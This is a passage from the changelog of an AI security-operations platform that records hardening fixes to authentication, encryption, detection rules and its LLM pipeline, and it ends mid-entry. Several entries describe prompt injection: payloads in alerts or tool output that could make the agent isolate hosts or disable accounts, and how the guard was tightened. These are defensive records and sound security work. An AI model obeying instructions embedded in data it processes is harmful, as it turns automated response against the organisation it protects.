- **Operator tooling for the paths that only matter under failure
  ([#696](https://github.com/beenuar/AiSOC/pull/696),
  [#697](https://github.com/beenuar/AiSOC/pull/697)).** AES-256-GCM backup
  encryption in `scripts/backup_crypt.py` (chunk-framed with a per-chunk nonce
  and AAD binding the chunk index, so a truncated or reordered archive fails to
  decrypt rather than restoring a smaller database, plus a SHA-256 manifest);
  scheduled Neo4j, Qdrant and Redis backups via a Helm CronJob;
  `scripts/support_bundle.py`; a per-investigation cost budget; and per-tenant
  ingest token buckets in `internal/inbox/ratelimit.go` (per-replica, and
  documented as such) on the one endpoint deliberately open to the internet.

### Fixed

- **The sandbox determinism test compared a timer.** Its `VOLATILE` list named
  four fields the CLI does not emit — the real one is `elapsed_ms` — so the
  comparison included a wall-clock value and failed whenever two runs
  straddled a millisecond boundary, reporting "Something in the reasoner
  depends on salted hashing again" and sending a reader after a `hash()` call
  that was not there. Volatile fields are matched by suffix now, because names
  are the thing that drifts and the `_ms` convention is not.
- **The devcontainer cold-start gate could only ever validate the previous
  image.** It probed the published `:latest` even on a pull request, by design
  — so a Dockerfile change was unverifiable until after it shipped, which is
  how a devcontainer whose non-root user was not in the `docker` group reached
  `main`. A PR touching `.devcontainer/**` now builds from its own source and
  probes that, and the trigger includes `.devcontainer/**` at all (it fired
  only on changes to the workflow file).
- **The Codespaces quickstart could never start Docker
  ([#716](https://github.com/beenuar/AiSOC/issues/716)).** The README
  advertises Codespaces as "the zero-install way to drive the real stack in a
  browser"; it failed at step 1 of `pnpm aisoc:demo` and was not recoverable
  from inside the codespace. The `docker-in-docker` feature does two things,
  and only the first has a Dockerfile equivalent: it installs the binaries
  (replicated), and it supplies container *runtime* options (`--privileged`,
  `--init`, a volume at `/var/lib/docker`) plus an entrypoint that launches
  `dockerd`. Capabilities are granted at container creation and cannot be
  self-granted from an image, so baking the binaries and stopping there
  produced a container with `CapEff: 0` and `CAP_SYS_ADMIN` outside the
  bounding set — `sudo` could not help, because the capability was not in the
  set to grant. `devcontainer.json` passes the runtime half now and
  `.devcontainer/start-docker.sh` is the missing entrypoint, running from
  `postStartCommand` so a stop-and-resume comes back with a working daemon.
  `apt install docker.io` also creates the `docker` group and puts nobody in
  it, so `node` could not reach the socket its own daemon creates and every
  command failed with a permission error that reads like a missing daemon.
  The cold-start gate is why this survived: it asserted the docker *CLI* was
  installed, which it is with no daemon anywhere. A third phase now starts a
  real daemon under the same flags and runs a container as the non-root user.
- **Service images were published amd64-only.** Apple Silicon is the majority
  of contributor laptops, and `pnpm aisoc:demo` — the README's headline
  "Docker + pnpm" path — could not pull a single service image there.
  Compose reported `no matching manifest for linux/arm64/v8` for every one,
  fell back to building four services from source, and the quickstart became
  a long silent build instead of a demo. The devcontainer image has been
  multi-arch all along, so the pattern existed and was simply never applied
  to the service images. This roughly doubles image-build time, which is the
  correct trade: a first run that cannot start is worse than a slower
  release.
- **The OSS screencast recorder defaulted to a commercial host.**
  `screencast.yml` recorded `https://tryaisoc.com` unless told otherwise and
  the shot list named that host in three shots, so a self-hoster running the
  workflow would record somebody else's deployment — and that hostname would
  then travel into the README caption. Both default to the local demo stack
  now, and the outro carries no URL at all, because a hostname there dates
  the cut and points viewers at an instance rather than at the project.
- **`beenuar/aisoc-action` does not exist as a repository.** Every
  `uses: beenuar/aisoc-action@v1` example in the README and the integration
  doc 404s. The reference that resolves is the monorepo subdirectory form,
  `beenuar/AiSOC/packages/aisoc-action@v8.1.0`, which is what both show now;
  `docs/operations/publishing.md` records what the short alias would actually
  require, since a Marketplace listing resolves to a repository root.
- **Config snapshots could never run, and reported themselves enabled.** The
  Go config-snapshotter called `GET {base}/v1/connectors/{id}/resource-config`;
  the connectors service serves `POST /api/v1/connectors/{id}/resource_config`.
  Four mismatches at once — method, prefix, separator, payload — and the last
  is not a typo: that endpoint requires decrypted `auth_config` in the body and
  the ingest service has no vault, so it could never have called that route at
  all. Renaming the URL would have turned a silent 404 into a silent 422.
  Silent either way, because a 404 maps to `ErrNotImplemented`, which the
  snapshotter treats as a soft skip — so an operator saw "T1.2 config snapshots
  enabled" on boot and zero `Configuration` nodes in the graph, with nothing
  connecting the two. Fixed with an instance-scoped route on the connectors
  service that resolves the saved instance and decrypts credentials the way
  `ConnectorScheduler` does at poll time, so the ingest service needs no
  secrets. Query values are escaped: an ARN containing `&` or `#` would
  otherwise truncate the URL or inject a parameter.
- **The documented "latest configuration" graph query matched zero edges.**
  `is_current`, `valid_from` and `valid_to` are declared in
  `schemas/graph-schema.yaml` and the published schema doc advertised an O(1)
  lookup via `:CONFIGURED_AS {is_current: true}`. Nothing wrote any of the
  three. The drift gate could not catch it, because it validates properties
  only on edges declared `event_edge: true` and this one is structural. All
  three are written now, with the limitation stated rather than implied:
  closing the previous interval needs a read-modify-write the ingest hot path
  deliberately does not do, so `valid_to` is **absent** while the interval is
  open — an open interval is not one that closed at the epoch — and the doc
  now shows the `ORDER BY valid_from DESC` query that actually works.
- **Four effective-permissions resolvers were documented as scaffolds long
  after they were implemented.** The endpoint docstring described Azure, GCP,
  Okta and GWS as returning HTTP 501, and the `NotImplementedError` branch had
  been unreachable for as long. All five resolvers report `coverage: "full"`.
  What is still limited is the *snapshot*, not the resolver: only Okta's is
  assembled from a live connector, because the other four expect a connector
  to answer the `__posture_snapshot__` sentinel and **no connector implements
  it**, so with live mode on they return 412 rather than a fabricated
  snapshot. That was honest but unrecorded, so `coverage: full` was the only
  figure a reader saw. A new gate pins the real shape of the gap in both
  directions — a resolver registered without a snapshot source fails, and so
  does a stale entry on the allow-list once its connector starts answering the
  sentinel. The gap is allowed to exist; it is not allowed to be invisible.
- **A fabricated investigation rendered whenever no run was selected.**
  `InvestigationTimeline.tsx` called `makeDemoTimeline()` — a named analyst, a
  routable source IP, "Session suspended; email dispatched" — with no demo
  gate. `check_mock_data_gated.py` missed it because it matches `MOCK_*` /
  `DEMO_*` constant *names* and this is a function call, which is the other of
  the two ways to render invented state. Gated, and the gate now also catches
  a `set*(makeDemo*())` factory. Verified by reverting the component: the
  widened gate names the exact line.
- **A ChatOps approval authorized nobody.** The Slack and Teams bots verified
  who clicked — Slack signs every interaction payload, Teams payloads carry an
  HMAC — recorded that person in an audit event, and then called
  `approve_action(action_id)` with no body. The actions service ran
  `authorize_approver` against `None`, so the permission-tier check *and*
  separation of duties were both skipped; the clicking user appeared in the
  audit trail and was never bound to the authorization decision. An approval
  path that does not authorize is worse than none, because it reads as a
  control.
  A bot cannot supply permissions — it knows a Slack user id and has no idea
  what that person may do in AiSOC, and a bot permitted to assert its own
  permissions could grant itself anything. It now asserts identity only, and
  the actions service maps it through `AISOC_CHATOPS_APPROVERS`: operator
  configuration rather than a directory lookup, because the actions service
  owns no user table and an approval should not depend on a second service
  being reachable. Fails closed — `AISOC_ACTIONS_REQUIRE_APPROVER` defaults
  true, an unmapped user is refused rather than admitted with an empty
  permission set, and a malformed map raises rather than resolving to "no
  approvers", which looks identical to correctly having none. **Operators
  using Slack or Teams approvals must populate the map or approvals will be
  refused**; that is the intended failure.
  Approve and reject are deliberately asymmetric: a rejection causes no vendor
  effect and a timeout-driven one has no human by definition, so requiring an
  identity there would strand expired requests in `awaiting_approval` forever.
  An identity supplied on a rejection is still authorized, and the decider is
  now recorded — it never was.
  Separately, the signed email-approval link pointed at
  `/v1/actions/email-decide`, a path served by no router, so every approve and
  deny button in a rendered approval email linked to a **404** — the documented
  fallback for "Slack is unreachable" failed at the moment it was needed. The
  route exists, and the recipient is signed into the token, because a bare
  signed link is a bearer credential that approves as nobody. Docs:
  `apps/docs/docs/operations/action-approvals.md`, which states the three
  remaining limitations rather than implying they are closed.
- **One `not` rule silently discarded a tenant's entire business-context rule
  set.** Rules are parsed twice by two implementations. The console requires
  `not` to be a mapping; the triage worker iterated every aggregator as a
  list, and iterating a mapping yields its string keys — so
  `_parse_condition("field")` called `.get()` on a `str`, raised
  `AttributeError`, and the caller's catch turned that into `rules = []`. A
  single console-accepted rule therefore stopped every *other* rule that
  tenant had written, suppressions included: a rule written to suppress
  known-benign noise quietly stopped suppressing, with nothing on the console
  to say so and one `warning` in the worker log. Fixed in two places, because
  the parser bug and its blast radius are separate problems — `not` takes a
  mapping now, and a rule that fails to parse is skipped while the rest
  survive. Also closed two smaller divergences: the worker accepted any
  `route_to` string while the console validated against a fixed set, and the
  two copies of that set had nothing pinning them together.
- **The API service had no LLM input contract at all.** `services/agents` has
  had a fail-closed one since T2.3 landed there; the module this repo's own
  notes described as living at `services/api/app/services/llm_safety.py` was
  absent from the tree. Seven endpoints POSTed untrusted input straight to a
  chat-completions provider — `phishing` (a submitted email body,
  attacker-authored by definition), `translation`, `knowledge_base`, `hunts`,
  `nl_detection`, `detection_loop`, and `alert_explain` (a JSON dump of the
  alert). All validate before the request now, because a check that runs after
  it is a log line rather than a control.
  The rules are shared rather than reimplemented: they sat in `contract.py`
  next to LangChain, the cost-telemetry recorder and the response cache, none
  of which ship in the API image — which is precisely why the API could not
  run them. They now live in `contract_rules.py` with stdlib imports only,
  vendored byte-identically and gated by
  `scripts/sync_vendored_llm_contract.py --check`. Two heuristics disagreeing
  about what counts as a raw log would be worse than one.
  Two more holes closed alongside: `services/agents/app/api/explain.py`
  reached a model with raw `httpx` and never touched the contract, invisible
  to a gate that walked the AST for `.ainvoke`/`.astream` only — it proved the
  LangChain path clean and said nothing about the other way to reach a model,
  so a second gate now flags any file that both names a completions endpoint
  and issues its own POST. And the NL-query translator, one file vendored into
  both services, imported `app.llm.contract` and `app.llm.factory` — neither of
  which exists in the API process. The `ImportError` was swallowed, so
  `/nl-query` always returned the deterministic translation and **never
  reached a model**: safe by accident, and invisible.
- **The detection truth table was a gate that could certify a no-op.** It
  classified rules by file path and by the key names inside `detection:`, never
  consulting the engine — so it published **947 executable** while the engine
  loaded **825**, counted 77 imported Sigma rules that have no evaluator
  anywhere in the repo, and counted 44 native rules with no compiled spec. The
  danger was worse than a wrong number: because it keyed off `_quarantine/`
  membership, a bulk un-quarantine would have raised the published figure
  without changing what fires. Executable now means "the engine loads this id".
- **663 of 825 loaded rules matched on fields that were not visible.**
  `raw_data` carries the connector's normalized dict and connectors put the
  vendor payload one level down under `raw_event`, while the matcher does a
  flat `event.get(field)`. Fixture replay could not catch any of them, because
  fixtures are synthesized from the rule they test. The workaround in the tree
  was per-field hoisting inside individual connectors. Both engines now merge
  the payload once, with connector keys winning on collision.
  `scripts/check_detection_fields.py` ratchets the 138 rules that depend on
  fields nothing computes.
- **26 connectors were mis-attributed and mostly unpromotable.** 31 envelope
  dicts emitted `raw` instead of `raw_event`, missing the normalizer's
  `isCanonicalEnvelope` check and falling through to a fallback that borrowed
  the `splunk_enterprise` profile. That profile stamps vendor "Splunk" — so
  Okta, QRadar, Carbon Black, Netskope and 22 others reported alerts as coming
  from Splunk — and is `class_uid` 4001 with an *empty* severity map, so
  category 4 with severity 0 satisfied neither branch of `should_promote()` and
  their events could never become alerts. Replaced with a vendor-neutral
  `genericProfile`.
- **The dependency audit silently skipped a service** (#650). A failed `poetry
  export` was a warning, so `services/slack-bot` fell out of the scan while the
  job passed. A gate that quietly skips is worse than one that fails, because
  it reads as coverage that is not there. Coverage gaps now fail the job, and
  regenerating the lock surfaced eleven advisories across `idna`,
  `pydantic-settings`, `anyio`, `aiohttp` and `starlette` — nine of which were
  only visible once the scan actually ran.
- The MCP README's audit-trail claim, the quarantine README's translation
  instructions (which documented the no-op YAML path that produced the 44
  orphans), and the orphaned `detections/splunk-imports/_migrated/` directory
  of 16 files that no script, workflow or doc referenced.
- **Four documented security controls did not exist
  ([#696](https://github.com/beenuar/AiSOC/pull/696)).** AES-256-GCM backup
  encryption — the script gzipped and uploaded. Envelope encryption as the
  control mitigating a database dump — `EnvelopeCipher` had zero callers. One
  unbroken distributed trace — neither end of the Kafka spine emitted
  OpenTelemetry. Per-tenant retention marked GATED by a test asserting the
  purge SQL *parses* while nothing called it. Four more docs told operators to
  run `alembic downgrade` against a service with no Alembic, so the documented
  recovery path failed at the one moment it was needed. Each was corrected in
  the docs **and then implemented**, so the claim could return honestly:
  envelope encryption now carries `vault:v2:` tokens with `vault:v1:` read
  compatibility and fail-closed behaviour in both directions (the three
  vendored read-path copies *refuse* a `vault:v2:` token rather than returning
  ciphertext as plaintext); retention actually deletes; and tenant offboarding
  covers all five stores, with the Postgres table list discovered from
  `information_schema` rather than hardcoded — 14 of 72 tenant-scoped tables
  had no cascade, so deleting a tenant orphaned institutional memory and
  compliance evidence.
- **The prompt-injection guard missed every action-trigger payload
  ([#697](https://github.com/beenuar/AiSOC/pull/697)).** Adversarial recall was
  **0.22**, and the payloads that got through were the ones that produce a real
  isolate or disable — which turns the SOC into a denial-of-service aimed at
  its own estate. Eight new patterns take recall to **0.85** with zero false
  positives.
- **Nine capabilities declared a verification probe and three had one
  ([#697](https://github.com/beenuar/AiSOC/pull/697),
  [#698](https://github.com/beenuar/AiSOC/pull/698)).** Two probes were added
  and four declarations corrected to `false` with stated reasons, and
  "unverifiable means not autonomous" is now enforced: probes are required
  unconditionally for AUTOMATIC and for HIGH/SEVERE impact regardless of
  approval tier, and waived below MODERATE where the API response *is* the
  confirmation. `suspend_session` and `force_mfa` were demoted AUTOMATIC →
  ANALYST accordingly. Building the gate surfaced **eleven capabilities with a
  contract and no executor at all, including `unisolate_host`** — the rollback
  for the most disruptive action in the product resolved to nothing — fixed
  with a `KNOWN_ORPHANS` ratchet plus 17 new executors wired to client methods
  that already existed. Separately, `AzureEntraClient.get_user_enabled` called
  `_ensure_token()` with no argument and used the return value as a bearer
  token; the method takes a client and returns `None`, so every live call would
  have raised `TypeError` — invisible in simulation, which never constructs the
  client, and that method backs the `disable_user` probe, so a containment
  would have reported UNVERIFIED for an unrelated reason.
- **The sandbox's "deterministic" baseline moved every run
  ([#696](https://github.com/beenuar/AiSOC/pull/696)).** Risk scores used
  `abs(hash(str))`, with three comments calling it deterministic. CPython salts
  string hashing per process. The test runs the CLI under different
  `PYTHONHASHSEED` values, which is the only way to catch it.
- **The Helm chart could not be installed at all
  ([#696](https://github.com/beenuar/AiSOC/pull/696)).** Three templates
  referenced values absent from `values.yaml` — the UEBA deployment read
  `.Values.ueba.replicaCount` and there was no `ueba` key — so rendering
  failed before any cluster saw it.
- **Three shell and DR traps that only appear under failure
  ([#696](https://github.com/beenuar/AiSOC/pull/696)).** `pg_dump` stderr sent
  to `/dev/null` under `pipefail` handed an operator exit 1 with zero
  diagnostic; `fail() { ((ERRORS++)); … }` returns the *pre-increment* value,
  so under `set -e` the first failure killed the script before it printed why;
  and `grep -oP` made `restore --latest` impossible on macOS. `openssl enc`
  also refuses AEAD ciphers outright, which is why the AES-256-GCM path is a
  Python script on `cryptography` rather than a one-liner.
- **The one-directional gates
  ([#696](https://github.com/beenuar/AiSOC/pull/696),
  [#707](https://github.com/beenuar/AiSOC/pull/707)).** The graph-schema drift
  check compared the YAML vocabulary against Go and never the reverse, so it
  reported the schema consistent while Go declared 28 labels against the YAML's
  17; it now parses the declared Go type (`NodeLabel` vs `RelType`) instead of
  classifying by string casing, which had misread `IOC`. In the same family:
  `neq` was never a matcher operator despite eleven rules using it, so
  `approver_role_neq: "codeowner"` was read as a field literally named
  `approver_role_neq`; every one of those rules' fixtures encoded the clause
  key verbatim because `build_positive()` synthesizes fixtures *from the rule*,
  so the durable fix is in the generator rather than the 22 files that
  regenerate from it; and `test_positive_fixtures_fire_and_negatives_do_not`
  only ever replayed the positives, leaving 100+ negative fixtures unrun under
  a test whose name says otherwise. Derived fields (`is_business_hours`,
  `<a>_eq_<b>` / `<a>_neq_<b>`) took the unreachable-rule ratchet from 138 to
  **133**, now reported by family — needs windowed engine, identity enrichment,
  allowlists, invented operands — so the number is actionable rather than bare.
- **A vendor's help text broke the entire docs deploy
  ([#708](https://github.com/beenuar/AiSOC/pull/708)).** Lacework's field help
  contains `https://<account>.lacework.net`, and Docusaurus parses `.md` under
  MDX, so `<account>` is an unclosed JSX element — one of which fails the whole
  build. The generator escapes angle brackets now, skipping code spans, with a
  gate over every connector page, because nothing about "MDX compilation
  failed" points at a vendor help string.
- **Six duplicate connector pages, with the gate reporting 100% coverage
  throughout ([#712](https://github.com/beenuar/AiSOC/pull/712)).** `_slug()`
  assumed hyphenated filenames; six pages predate that convention and use
  underscores, so the coverage check saw nothing at the hyphenated path and
  generated a thinner second page beside each hand-written original. The
  sidebar is generated from the same slug, so it listed only the thin copy and
  dropped the better half of each pair out of navigation. An existing page now
  wins over the convention, and a guard fails the gate when two pages differ
  only by separator.
- **Eight dead links survived in the published docs with a link checker running
  on every PR ([#709](https://github.com/beenuar/AiSOC/pull/709),
  [#718](https://github.com/beenuar/AiSOC/pull/718),
  [#719](https://github.com/beenuar/AiSOC/pull/719)).** A full QA pass over
  `https://beenuar.github.io/AiSOC/` — 167 sitemap pages, 170 internal and 405
  external link targets — took the health score from 81 to 99. Seven of the
  dead links pointed at three GitHub organisations that do not exist, and the
  wrong org was baked into the *generator* `scripts/curate_detections.py`, so
  fixing the page alone would have regenerated the 404. The link job could not
  catch this class: it runs lychee with `fail: false` and
  `--accept …403,429`, and GitHub rate-limits unauthenticated crawls hard, so a
  403 from rate limiting is indistinguishable from the page existing.
  `scripts/check_repo_self_links.py` is the deterministic offline replacement.
  Two links into `docs/` (which the site does not serve) also took the whole
  deploy down, since Docusaurus treats a broken relative link as a build
  failure. Stale counts were re-read from the tree — 84 connectors, not 47;
  833 executable rules, not "800 fixture-tested".
- **A hydration mismatch from adjacent JSX children
  ([#718](https://github.com/beenuar/AiSOC/pull/718)).** An SVG `<title>` built
  from several adjacent children gets `<!-- -->` separators injected during
  SSR that the client does not reproduce (React error #418). Build the whole
  string as one template literal so there is exactly one text node.
- **Sixty-six Dependabot alerts down to seven**
  ([#686](https://github.com/beenuar/AiSOC/pull/686),
  [#691](https://github.com/beenuar/AiSOC/pull/691),
  [#694](https://github.com/beenuar/AiSOC/pull/694),
  [#701](https://github.com/beenuar/AiSOC/pull/701),
  [#703](https://github.com/beenuar/AiSOC/pull/703),
  [#705](https://github.com/beenuar/AiSOC/pull/705),
  [#706](https://github.com/beenuar/AiSOC/pull/706),
  [#710](https://github.com/beenuar/AiSOC/pull/710), plus routine bumps in
  [#687](https://github.com/beenuar/AiSOC/pull/687)–[#714](https://github.com/beenuar/AiSOC/pull/714)).
  The three remaining highs are unpatchable (`ecdsa`, `image-size`). Two
  recurring shapes are worth remembering. A **caret pin that excludes the fix
  makes a security update unsolvable rather than pending**: the pytest advisory
  covers `< 9.0.3` and `^7.4.0` cannot reach it, so Dependabot had no version
  to propose and the failure surfaced as a red workflow rather than an open
  alert — ten services carried four different constraints for no reason, now
  uniformly `>=9.0.3,<10.0`. And **a range that permits the fix is not a lock
  that takes it**: the agents lock held langchain 1.0.2 against a 1.3.9 fix,
  all inside the existing caps. Transitive advisories need an override with a
  major ceiling, because without `<5` `@vitest/mocker` resolved to 5.0.1 —
  taking a major version of the test runner's mocking layer as a side effect of
  a security patch is how unrelated breakage gets blamed on security work.
  `dompurify` is the one worth naming: it is the sanitiser behind rendered
  report HTML, so a version below the fix was a live XSS surface in a product
  whose job is being trusted with hostile input.
- **The Fly demo outage finally has a stated cause
  ([#698](https://github.com/beenuar/AiSOC/pull/698)).** The self-provisioning
  deploy ran on merge and Fly answered: *"Your account has overdue invoices."*
  Both apps were reclaimed for non-payment, and the workflow's old silent
  `exit 0` when the app was missing hid that behind weeks of green runs. The
  error message used to guess at causes and got them wrong; it now prints
  Fly's own message verbatim. This is a billing action only the account owner
  can take, not a code fix.
- **Three CodeQL findings, at the root rather than around them
  ([#700](https://github.com/beenuar/AiSOC/pull/700),
  [#708](https://github.com/beenuar/AiSOC/pull/708)).** A previous attempt
  parenthesised an implicit concatenation without removing it, and added a
  top-level import alongside an existing from-import — turning one
  `py/import-and-import-from` alert into two. Fixed properly: setup prose built
  as named strings before the list, one import style per module, and four
  `py/unnecessary-lambda` findings cleared. Generated pages verified
  byte-identical.

### Changed

- Eleven new claim-to-gate matrix rows, one per capability. 84 rows: 73 GATED,
  11 PARTIAL, 0 NO GATE. The field gate is recorded as `GATED (ratchet)` with
  its closing condition rather than as clean, because 138 rules still depend on
  computed fields and claiming otherwise would be the overstatement the matrix
  exists to prevent.
- The claim-to-gate matrix ends the wave at **102 rows: 93 GATED, 9 PARTIAL, 0
  NO GATE**, one row per capability added above, each backed by a test that
  fails against the old behaviour. The ratchet (`MAX_NO_GATE = 0`) still
  forbids a regression, and no `PARTIAL` row was relabelled without building
  the gate it names — relabelling would make the file a liability instead of a
  control.
- Of the twelve hardening phases, **Phase 4 is now the only one unchecked, and
  deliberately so**: what remains is a funded provider key for the live-agent
  eval, not code. Marking it done would be the exact failure the program exists
  to prevent.
- The wave-2 work adds six more rows, closing at **108 rows: 99 GATED, 9
  PARTIAL, 0 NO GATE** — one per capability whose gate this release built:
  authorized approvals, the signed email link, the LLM input contract across
  both services, rule-id agreement between engine and catalogue, which identity
  providers can resolve permissions live, and config snapshots reaching the
  graph. Four carry a named caveat rather than a clean claim, because the
  limitation is real: approvals are still an in-process dict, the contract is
  a leak control rather than an injection sanitizer, four of five posture
  snapshots cannot be collected, and `is_current` is set on write and never
  cleared.
- **The wave-2 backlog in [#362](https://github.com/beenuar/AiSOC/issues/362)
  was wrong in both directions.** Two items (business-context rules,
  effective-permissions resolvers) were already built, and four had the
  capability present with the path that feeds it broken — which is the same
  shape v8.0 found a dozen times. Auditing each item against the tree before
  writing code is now the first step of any wave, not an optional one.

- **A rule id named one rule in the engine and a different one in the
  catalogue.** #697 made ids position-independent by pinning
  `(category, slug) → rule_id` in `detections/rule-ids.lock.json`, but nothing
  reconciled the lock against the YAML already on disk and the `--check` mode
  was never written, so the committed pack fell **45 network rule ids** behind
  the generator. Because the id is the join key between an alert and its
  catalogue entry, the effect was not a stale file: `det-network-037` fired as
  "DNS TXT Response Over 250 Bytes From Non-Resolver Host" and published — in
  the YAML, `marketplace/index.json` and the curated coverage manifest — as
  "DNS Tunnel Indicator: Long Hex Subdomain Sequence". An analyst taking a rule
  id off an alert and looking it up read a different rule's description,
  false-positive notes and playbook. Precisely the harm the lock's own
  docstring warns about.
  Three things were wrong at once, and each hid the next:
  - `export_detection_ruleset.py` still computed ids **positionally**
    (`seen[category] += 1`) under a comment saying it mirrored
    `generate_detections.py` — true when written, false once the generator
    moved to the lock. Two generators with two numbering schemes. It reads the
    lock now, so there is one source of id truth, and inserting a spec no
    longer moves an id the alert table already references.
  - `generate_detections.py` had no `--check`, so nobody could see the drift.
    It has one, it reports moved ids separately from other changes because a
    moved id is the serious case, and it runs in
    `validate-detections.yml`.
  - `tests/test_detection_id_stability.py` compared `assign_ids()` output
    against the lock — and `assign_ids()` reads the lock, so for the property
    that matters the comparison was circular. Six tests passed throughout,
    under a docstring describing this exact failure. Four new tests compare the
    published surfaces against **each other** in both directions: YAML against
    the lock, the engine against the lock, and — stating the user-visible
    property directly — that an id names the same rule in the engine and in the
    catalogue. The reordering test had to *reorder* specs rather than assert a
    re-export is a no-op, because the lock was seeded from the current spec
    order, so the two schemes agree until the day someone inserts a rule; it
    moves 81 engine ids against the old exporter.


## [8.0.0] — 2026-09-22

**Close the loop.** v8.0 was reserved for the package-publish milestone. That
turned out to be the wrong thing to name a major release after, because a
competitive read of the AI-SOC market says buyers are not choosing on
distribution — they are choosing on whether the platform can prove it did
what it said. So v8.0 is the release that connects capabilities the codebase
already contained but never wired together, and the npm/PyPI publish moves to
v8.1 where it belongs.

The pattern across almost every item below is the same, and it is worth
stating plainly: the mechanism existed, was tested in isolation, and had no
caller on the path that needed it. A passing unit test on an uncalled function
is indistinguishable from a working feature until someone traces the call
graph.

### Added

- **Response actions are verified against the vendor.** Outcome verification is
  the line the market draws between a tool that recommends and one that
  responds. `AutonomyDecision.requires_verification` was computed for every
  auto-executed action at MEDIUM blast radius and above, and the dispatcher
  dropped it; `PostActionVerifier` had no caller outside its own test. The
  dispatcher now re-queries after a real, successful execution and records the
  outcome. A vendor that accepts the call while the effect is absent downgrades
  the action to FAILED instead of leaving it reported as succeeded — that gap
  is how a SOC comes to believe a host is contained when it is not.
  `unverified` stays `unverified` and is never upgraded to a confirmation.
- **The isolation probe reads real containment state.** It previously returned
  `bool(device_id)`, true for every host in the fleet, so it would certify an
  uncontained host as verified. Adds `get_containment_status` to the
  CrowdStrike client; `containment_pending` deliberately does not count. A new
  probe covers `block_ip` by re-reading the enforcing security-group rules.
- **Autonomy is governed by the tenant's own policy.** The console has written
  a per-tenant L0–L4 tier, per-action overrides and a HIGH-blast whitelist to
  Postgres since v7.6; the dispatcher read none of it and resolved autonomy
  from one deployment-wide `AISOC_MATURITY_TIER`. Every tenant in a
  multi-tenant install shared a posture, and a tenant who selected L2 in the UI
  got whatever the operator had exported. `maturity.evaluate_gate` — the
  function that does understand per-tenant policy — had no callers anywhere.
  The `whitelisted` flag is now passed to `decide()`; it had been left at its
  default of False, which made the L4 break-glass path unreachable.
- **Analysts can hunt the events AiSOC itself ingested.** Every connector's
  events are archived to ClickHouse `aisoc.raw_events`, and nothing could query
  them: `/nl-query/execute` only ever executed against Elasticsearch, so a
  tenant whose data lives in the platform's own lake got "ES_URL not
  configured" and could not query anything they had ingested. The translator's
  structured IR now compiles to parameterised ClickHouse SQL, with the tenant
  predicate generated as part of the WHERE clause rather than rewritten in
  afterwards, and no analyst text reaching the SQL string.
- **Auto-escalated alerts get the context manual ones get.** The manual
  investigator has built a `ContextBundle` — graph neighbourhood, blast radius,
  historical verdicts for the same entities, UEBA baselines — since v7.5. The
  escalation path never did, so the high-volume automatic route investigated a
  true positive knowing nothing about how identical alerts had resolved before.

### Fixed

- **Repeat-alert suppression could never fire.** v7.7 shipped the compounding
  loop as "a repeat alert matching a trusted benign prior is auto-resolved
  without re-triage", measured as `repeat_alerts_suppressed` on
  `/metrics/funnel`. The signature was `evidence_fingerprint(tenant,
  raw_alert)`, and `raw_alert` carries the alert row id, the source event ids
  and the raw event payload — all unique per alert. Every alert hashed to a
  unique fingerprint, so each outcome prior was written under a key nothing
  would look up again and the metric could only ever report zero. Two features
  were dead, not one: every repeat also paid for a fresh LLM triage the dedup
  cache should have served for nothing. `test_outcome_memory.py` missed it
  because it calls `record_outcome` and `lookup_prior` with the same literal
  signature string, which holds for any key scheme including a broken one.
- **Three services were fully unauthenticated.** `purple-team`, `honeytokens`
  and `ueba` each mounted their entire API with no authentication, so anyone
  who could reach the port could launch attack simulations, mint or read
  honeytokens, and read per-user behavioural risk scores. Auth is applied at
  the router level so a route added later is protected by default.
- **The live-action router had no authentication.** `/api/v1/live-actions`
  reaches `dispatch()`, which isolates hosts, disables accounts and blocks IPs
  against live vendors, while the legacy actions router mounted beside it had
  required a service token on every mutating route since it was written.
- **Two cross-tenant leaks in the entity graph.** `get_entity_neighbors`
  accepted a `tenant_id` and never used it — no predicate in the Cypher, and
  the parameter was not even passed to the driver — so naming any node id
  returned another tenant's host, user or IOC plus every neighbour with full
  properties. `get_blast_radius` filtered only the traversal's start node and
  accepted `tenant_id IS NULL`, so an APOC expansion could leave the tenant's
  estate through a shared entity and enumerate another tenant's hosts and
  users. Every node of every path is now scoped, through one shared predicate.
- **Business-context rules never reached triage.** The API stored them in a
  module-level dict inside whichever process served the write, and the
  auto-triage worker loaded rules only from a YAML file whose path nothing
  sets. A tenant could author "this host is a domain controller, escalate
  anything touching it", see it saved, preview it against their last 50
  alerts, and have it apply to no triage decision ever. Migration 050 adds
  `aisoc_business_context_rule_sets` and the worker resolves per tenant from it.
- **Verdicts could auto-close on reasoning the evidence contradicts.**
  `score_groundedness` measures what fraction of the indicators an output
  asserts actually appear in the evidence, and had no caller in the service. A
  confident `false_positive` citing an IP that appeared nowhere in the alert
  was persisted, written back as a prior that would suppress future alerts, and
  closed. Auto-closing verdicts below the floor are now demoted to
  `needs_review` with the unsupported indicators named in the findings.
- **The tool-calling loop bypassed the LLM input contract.** `run_with_tools`
  feeds tool output straight back into the prompt, and tool output is
  untrusted: a SIEM row or threat-intel record can carry text that reads as an
  instruction. Calling `bound.ainvoke` directly skipped injection validation on
  the highest-risk content in the system and lost cost telemetry for every turn.
- **QRadar could never be federated to.** `to_aql` is written, exported and
  tested, and the QRadar connector implements `federated_search` with it. The
  type was missing from the API's `FEDERATED_CAPABLE_TYPES`, so a tenant with
  an enabled QRadar connector was silently excluded from every federated search.
- **The API-keys panel issued keys that authenticated nothing.** It generated
  an `aisoc_live_…` secret in the browser with `crypto.getRandomValues`, told
  the user to save it because it would not be shown again, and never sent it
  anywhere. Someone would paste it into a CI pipeline or a forwarder and get
  silent 401s while believing they held a working credential. Revoking filtered
  a row out of local state. The real CRUD backend existed all along.
- **Fabricated security data rendered as tenant state across 24 components.**
  Alerts, cases, connectors, playbooks, detections, hunt, attack graph, threat
  intel, SLA, audit, RBAC, purple team, identity permissions, EASM and shift
  handoff each served a `MOCK_*` / `DEMO_*` array when the API call failed,
  none of it gated on demo mode. A fabricated alert is indistinguishable from a
  real one, and the worst of them invented things a customer makes decisions
  from: MITRE coverage claiming which techniques they can detect, SLA
  percentages, an external attack surface with a risk score. It also persisted
  — SWR v2 disables `revalidateOnMount` whenever `fallbackData` is supplied, so
  most of these were not first-paint placeholders but what the view showed.
- **Executor rollbacks did not call the vendor.** `isolate_host`,
  `disable_user` and `suspend_session` logged an intent and returned True, so
  an operator who rolled back a lockout was told the account was restored while
  it stayed disabled. The real reverse calls existed in `app.services.rollback`
  with no caller outside their own test.
- **Three unreachable routes.** `GET /assets/vulnerabilities` and the agents'
  `/hunts/runs` and `/hunts/findings` were registered after a parameterised
  `/{id}` route that shadowed them.
- **The osquery playbook step crashed on import.** It imported client modules
